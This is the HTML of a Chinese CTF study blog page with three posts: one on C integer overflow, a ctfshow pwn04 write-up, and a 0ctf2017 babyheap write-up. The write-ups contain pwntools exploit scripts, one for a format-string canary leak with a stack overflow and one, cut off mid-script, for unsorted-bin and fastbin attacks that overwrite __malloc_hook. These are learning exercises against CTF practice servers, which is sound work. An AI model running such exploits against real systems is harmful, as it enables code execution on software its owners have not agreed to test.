+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">整数溢出</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-10 00:23:14 / Modified: 01:42:55" itemprop="dateCreated datePublished" datetime="2022-04-10T00:23:14+08:00">2022-04-10</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><h2 id="各种数据类型的字节大小与范围"><a href="#各种数据类型的字节大小与范围" class="headerlink" title="各种数据类型的字节大小与范围"></a>各种数据类型的字节大小与范围</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>字节</th>
+<th>范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>short int</td>
+<td>2byte(word)</td>
+<td>0<del>32767(0</del>0x7fff)<br/>-32768<del>-1(0x8000</del>0xffff)</td>
+</tr>
+<tr>
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td>0<del>65535(0</del>0xffff)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4byte(dword)</td>
+<td>0<del>2147483647(0</del>0x7fffffff) -2147483648<del>-1(0x80000000</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td>0<del>4294967295(0</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>long int</td>
+<td>8byte(qword)</td>
+<td>正: 0<del>0x7fffffffffffffff 负: 0x8000000000000000</del>0xffffffffffffffff</td>
+</tr>
+<tr>
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td>0~0xffffffffffffffff</td>
+</tr>
+</tbody></table>
+<p>1、数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于硬件的制约，数据都是有长度的限制的（超过最多宽度的数据都会被计算机直接丢弃）</p>
+<p>2、4位宽度表示，假设计算机只能储存4位二进制数对于计算机而言</p>
+<p>无符号数：0 1 2 3 4 5 6 7 8 9 A B C D E F</p>
+<p>有符号数：正数：0 1 2 3 4 5 6 7</p>
+<p>负数-1 -2 -3 -4 -5 -6 -7 -8         </p>
+<p>​        F  E  D  C  B  A  9   8（十六进制数）     </p>
+<p>​        1111（F） 1110(E) 1101(D)…..</p>
+<p>​        所以对于计算机而言二进制第一位为1为负数，第一位为0为正数</p>
+<p>如下图的蓝色圆圈理解</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/10/67c58a371df2d4ce.jpg"></p>
+<h2 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 伪代码</span><br><span class="line">short int a;</span><br><span class="line"></span><br><span class="line">a = a + 1;</span><br><span class="line"># 对应的汇编</span><br><span class="line">movzx  eax, word ptr [rbp - 0x1c]</span><br><span class="line">add    eax, 1</span><br><span class="line">mov    word ptr [rbp - 0x1c], ax</span><br><span class="line"></span><br><span class="line">unsigned short int b;</span><br><span class="line"></span><br><span class="line">b = b + 1;</span><br><span class="line"># assembly code</span><br><span class="line">add    word ptr [rbp - 0x1a], 1</span><br></pre></td></tr></table></figure>
+
+<p>上界溢出有两种情况，一种是 <code>0x7fff + 1</code>， 另一种是 <code>0xffff + 1</code></p>
+<p>因为对于计算机而言数字是不分有符号和无符号的（都是通过人来定义），数据都是通过二进制形式存在。</p>
+<h3 id="0x7fff-1"><a href="#0x7fff-1" class="headerlink" title="0x7fff+1"></a>0x7fff+1</h3><p>0x7fff+1对于无符号整型是没有影响的，但是对于有符号数0x7fff（32767）+1而言却表示的是0x8000（-32768）</p>
+<h3 id="0xffff-1"><a href="#0xffff-1" class="headerlink" title="0xffff+1"></a>0xffff+1</h3><p>0xffff（65535）+1对于无符号整形是等于0x0000，对于有符号0xffff（-1）+1来说也是等于0x0000</p>
+<h2 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h2><p>下界溢出的原理和上界的溢出的原理是一样的，只是将加法运算改为了减法运算</p>
+<h3 id="0x0000-1-0xffff"><a href="#0x0000-1-0xffff" class="headerlink" title="0x0000-1=0xffff"></a>0x0000-1=0xffff</h3><p>对于有符号整数来说，0-1等于-1没有问题，但是对于无符号整数来说0-1却等于0xffff（65535）</p>
+<h3 id="0x8000-1-0x7fff"><a href="#0x8000-1-0x7fff" class="headerlink" title="0x8000-1=0x7fff"></a>0x8000-1=0x7fff</h3><p>对于无符号整数来说32768-1=32767是正确的，但是对于有符号整数来说就变成了-32768-1=32767</p>
+<h2 id="在wiki的整数溢出的例子中总结为了两种情况"><a href="#在wiki的整数溢出的例子中总结为了两种情况" class="headerlink" title="在wiki的整数溢出的例子中总结为了两种情况"></a>在wiki的整数溢出的例子中总结为了两种情况</h2><h3 id="未限制范围"><a href="#未限制范围" class="headerlink" title="未限制范围"></a>未限制范围</h3><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stddef.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int len;</span><br><span class="line">    int data_len;</span><br><span class="line">    int header_len;</span><br><span class="line">    char *buf;</span><br><span class="line"></span><br><span class="line">    header_len = 0x10;</span><br><span class="line">    scanf(&quot;%uld&quot;, &amp;data_len);</span><br><span class="line"></span><br><span class="line">    len = data_len+header_len</span><br><span class="line">    buf = malloc(len);</span><br><span class="line">    read(0, buf, data_len);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test.c</span><br><span class="line">$ ./a.out</span><br><span class="line">-1</span><br><span class="line">asdfasfasdfasdfafasfasfasdfasdf</span><br><span class="line"># gdb a.out</span><br><span class="line">► 0x40066d &lt;main+71&gt;    call   malloc@plt &lt;0x400500&gt;</span><br><span class="line">        size: 0xf</span><br></pre></td></tr></table></figure>
+
+<p>只申请了0x20大小的堆，但是能输入的数据0xffffffff长度的数据，可以从整数溢出到堆溢出</p>
+<h3 id="错误的类型转换"><a href="#错误的类型转换" class="headerlink" title="错误的类型转换"></a>错误的类型转换</h3><h4 id="1-范围大的变量赋值给范围小的变量"><a href="#1-范围大的变量赋值给范围小的变量" class="headerlink" title="1.范围大的变量赋值给范围小的变量"></a>1.范围大的变量赋值给范围小的变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void check(int n)</span><br><span class="line">&#123;</span><br><span class="line">    if (!n)</span><br><span class="line">        printf(&quot;vuln&quot;);</span><br><span class="line">    else</span><br><span class="line">        printf(&quot;OK&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    long int a;</span><br><span class="line"></span><br><span class="line">    scanf(&quot;%ld&quot;, &amp;a);</span><br><span class="line">    if (a == 0)</span><br><span class="line">        printf(&quot;Bad&quot;);</span><br><span class="line">    else</span><br><span class="line">        check(a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test2.c</span><br><span class="line">$ ./a.out</span><br><span class="line">4294967296</span><br><span class="line">vuln</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码将一个长整型的数据传入了整型数据中，会造成截断，只将后四位数据传入整型</p>
+<p>在上述例子中，就是把 <code>long: 0x100000000 -&gt; int: 0x00000000</code>。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" class="post-title-link" itemprop="url">格式化字符串泄露canary</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-02 19:19:30 / Modified: 19:36:55" itemprop="dateCreated datePublished" datetime="2022-04-02T19:19:30+08:00">2022-04-02</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="一道利用格式化字符串漏洞来绕过canary防护的题目"><a href="#一道利用格式化字符串漏洞来绕过canary防护的题目" class="headerlink" title="一道利用格式化字符串漏洞来绕过canary防护的题目"></a>一道利用格式化字符串漏洞来绕过canary防护的题目</h1><p>题目是ctfshow的pwn04，一道纯粹的利用printf漏洞来泄露出canary的题目<br>将题目checksec一下可以看到题目开了canary防护<br>反汇编代码：<br><img src="https://i.bmp.ovh/imgs/2022/04/02/3b77825375723419.png" alt="反汇编代码"><br>并且该题可以进行两次数据的写入，偏移为0x70+4<br><img src="https://i.bmp.ovh/imgs/2022/04/02/3cd07a5db0d46aec.png"></p>
+<p>从下面汇编代码可以知道，该题是将canary放在了ebp+0xC地址处<br><img src="https://s3.bmp.ovh/imgs/2022/04/02/7a86962c3018516b.png" alt="汇编"></p>
+<p>从下图看一看到canary的格式化字符串偏移为0x31<br><img src="https://i.bmp.ovh/imgs/2022/04/02/4c44243d682d4da9.png" alt="偏移"></p>
+<p>该题的exp如下:</p>
+<pre><code class="python">from pwn import *
+#io=process(&quot;./ex2&quot;)
+io=remote(&quot;pwn.challenge.ctf.show&quot;,28142)
+io.recv()
+leak_canary=b&#39;%31$x&#39;
+io.sendline(leak_canary)
+canary=int(io.recv(),16)
+print(hex(canary))
+payload=b&#39;A&#39;*100+p32(canary)+b&#39;A&#39;*12+p32(0x804859b)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/03/31/babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/31/babyheap/" class="post-title-link" itemprop="url">0ctf2017_babyheap（学长的wp微改，学习用）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-31 00:00:00" itemprop="dateCreated datePublished" datetime="2022-03-31T00:00:00+08:00">2022-03-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-01 20:51:45" itemprop="dateModified" datetime="2022-04-01T20:51:45+08:00">2022-04-01</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017_babyheap"></a>0ctf2017_babyheap</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>  64位程序，保护全开</p>
+<p>程序是一个很常见的菜单题</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qDxpTJ"><img src="https://s1.ax1x.com/2022/03/28/qDxpTJ.jpg" alt="qDxpTJ.jpg"></a></p>
+<p>输入1申请堆块，输入2编辑堆块内容，3释放堆块，4打印堆块内容</p>
+<p>接下来看一下每个函数的逻辑</p>
+<p>首先是申请堆块</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qDzcxP"><img src="https://s1.ax1x.com/2022/03/28/qDzcxP.jpg" alt="qDzcxP.jpg"></a></p>
+<p>程序限制了用户可申请堆块的数量和大小，需要注意的是程序使用的是calloc()函数，calloc()函数会将申请的堆块清空</p>
+<p>接下来看编辑堆块内容</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrpaAe"><img src="https://s1.ax1x.com/2022/03/28/qrpaAe.jpg" alt="qrpaAe.jpg"></a></p>
+<p>这里会让用户自己输入需要填充的size,因为size可控，造成堆溢出</p>
+<p>剩下的释放堆块和打印堆块都是正常的free和show了，而且free之后把指针置零了，基本没啥可以利用的点，这里就不分析了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>主要思路是利用unsorted bin attack泄露libc的基址，然后利用fast bin attack改写某个地址的内容达到get shell的目的</p>
+<p>进行攻击之前先来学习一下一些前置知识</p>
+<p><code>__malloc_hook</code>钩子函数</p>
+<p>程序在调用<code>malloc()</code>函数时，如果<code>__malloc_hook</code>函数存在的话，程序会先执行钩子函数并返回，源码如下</p>
+<p><code>fast bin</code>的相关安全检查：首块<code>double free</code>检查，当一个<code>chunk</code>被free进<code>fast bin</code>前，会看看链表的第一个chunk是不是该chunk，如果是，说明<code>double free</code>了就报错；分配前size字段校验，从fastbin表中malloc出一个chunk时，拆卸前会检查要分配的这个chunk的size字段是不是真的属于它当前所在的fastbin表，如果size字段的值不是当前fastbin表的合法chunk大小值，则报错，其代码  <code>((((unsigned int)(sz)) &gt;&gt; (bitl == 8 ? 4 : 3)) – 2)</code>；根据size算得应在的表的下标，再和当前所在fastbin的下标对比</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span>*)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>当unsorted bin中只有一个chunk时，chunk的fd和bk指针都指向main_arena+0x58的位置</p>
+<p>我们可以写个例子调试一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="keyword">char</span> *A = <span class="built_in">malloc</span>(<span class="number">0x90</span>);			<span class="comment">//防止被top chunk合并</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrPGXq"><img src="https://s1.ax1x.com/2022/03/28/qrPGXq.jpg" alt="qrPGXq.jpg"></a></p>
+<p>可以看到，当<code>unsorted bin</code>中只有一个chunk时，该chunk的fd和bk指针都指向同一个地址：<code>main_arena+88</code>也就是0x58，而<code>__malloc_hook</code>函数则在<code>main_arena</code>的上方16个字节，也就是<code>main_arena</code>  + 0x10，通过简单的加减法就能得出<code>__malloc_hook</code>的地址为<code>fd - 0x58 - 0x10</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrV19U"><img src="https://s1.ax1x.com/2022/03/28/qrV19U.jpg" alt="qrV19U.jpg"></a></p>
+<p>但是fd和bk只有在chunk free状态下才会生效，由于程序打印堆块内容的函数会检测inuse位，而堆块释放的时候会将inuse位置0</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrZBaq"><img src="https://s1.ax1x.com/2022/03/28/qrZBaq.jpg" alt="qrZBaq.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrZ5Ix"><img src="https://s1.ax1x.com/2022/03/28/qrZ5Ix.jpg" alt="qrZ5Ix.jpg"></a></p>
+<p>也就是说我们要读一个既在使用状态又在free状态的chunk，显然这样的chunk时不存在的</p>
+<p>换个角度想，如果有一个使用状态的堆块包含一个free状态的堆块，那么我们打印使用状态的堆块就能把里面包含的那个free状态的堆块给打印出来了</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qruy79"><img src="https://s1.ax1x.com/2022/03/28/qruy79.png" alt="qruy79.png"></a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(chunk0)-&gt;<span class="built_in">malloc</span>(chunk1)-&gt;<span class="built_in">malloc</span>(chunk2)-&gt;<span class="built_in">malloc</span>(chunk3)-&gt;<span class="built_in">free</span>(chunk1)</span><br><span class="line">overwrite chunk1 size = chunk1+chunk2</span><br><span class="line"><span class="built_in">free</span>(chunk2)</span><br><span class="line">show(chunk1)</span><br></pre></td></tr></table></figure>
+
+<p>只需按以上步骤，即可打印出chunk2的fd指针</p>
+<p>为了更好地理解上面的步骤，我们可以gdb调试一下</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrQFyT"><img src="https://s1.ax1x.com/2022/03/28/qrQFyT.jpg" alt="qrQFyT.jpg"></a></p>
+<p>这是free掉chunk1后，可以看到此时chunk1的大小还没被改写，虽然chunk1的fd和bk指针指向了我们想要的地址，但是这样是打印不出来的，接下来我们向chunk0写入数据利用堆溢出覆盖掉chunk1的size为0x90+0x10+0x90+1即0x141</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrli4A"><img src="https://s1.ax1x.com/2022/03/28/qrli4A.jpg" alt="qrli4A.jpg"></a></p>
+<p>chunk1的size被改成了0x141</p>
+<p>接下来只需要把chunk1再calloc回来就能得到一个包含了chun2的chunk1</p>
+<p>但是由于重新分配的chunk1已经被清空了，所以我们需要再次通过堆溢出伪造chunk2的size字段</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qr8nHO"><img src="https://s1.ax1x.com/2022/03/28/qr8nHO.jpg" alt="qr8nHO.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qr8Nb8"><img src="https://s1.ax1x.com/2022/03/28/qr8Nb8.jpg" alt="qr8Nb8.jpg"></a></p>
+<p>可以看到经过填充之后chunk2被清空的size字段又被填回了0xa1</p>
+<p>free(chunk2)</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrGeRs"><img src="https://s1.ax1x.com/2022/03/28/qrGeRs.jpg" alt="qrGeRs.jpg"></a></p>
+<p>下面只需要打印chunk1的内容再经过简单计算就能得到__malloc_hook的地址了</p>
+<h3 id="fast-bin-attack"><a href="#fast-bin-attack" class="headerlink" title="fast bin attack"></a>fast bin attack</h3><p>泄露出__malloc_hook的地址之后，计算出距离libc基址的偏移，然后改写<code>__malloc_hook</code>地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = fd - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>fast bin</code>是单链表结构，用fd指针相连，所以我们可以通过修改chunk的fd指针来伪造一个fake chunk到<code>fast bin</code>中，然后连续malloc两次就能得到一个可以任意读写的地址，因为要修改<code>__malloc_hook</code>的内容，所以我们直接到<code>__malloc_hook</code>函数附近找一个符合要求的地址。为了绕过<code>fast bin</code>的size检查，我们必须找到伪造一个size符合<code>fast bin</code>的chunk</p>
+<p>在<code>__malloc_hook</code>-0x23的地方刚好有符合条件的size</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qr0ay4"><img src="https://s1.ax1x.com/2022/03/28/qr0ay4.jpg" alt="qr0ay4.jpg"></a></p>
+<p>0x7f是可以绕过<code>fast bin</code>的size检测的，将0x7f带入可以算出伪造的chunk在数组中下标应该为5</p>
+<p>即0x70大小的chunk</p>
+<p>总体攻击思路为申请两个处于<code>fast bin</code>大小内的chunk，一个用于堆溢出，一个用于伪造chunk</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrDMan"><img src="https://s1.ax1x.com/2022/03/28/qrDMan.png" alt="qrDMan.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrrPL4"><img src="https://s1.ax1x.com/2022/03/28/qrrPL4.jpg" alt="qrrPL4.jpg"></a></p>
+<p>可以看到伪造的chunk已经成功链入fast bin中</p>
+<p>接下来只需要把他申请出来然后编辑堆块内容来改写<code>__malloc_hook</code>的内容</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrsSAA"><img src="https://s1.ax1x.com/2022/03/28/qrsSAA.jpg" alt="qrsSAA.jpg"></a></p>
+<p>成功改写，下面只需要再次申请堆块就可以执行我们改写进__malloc_hook的内容了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29342</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./babyheap_0ctf_2017&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23-buu-64.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocte</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,string</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk0</span></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk1</span></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk2</span></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span 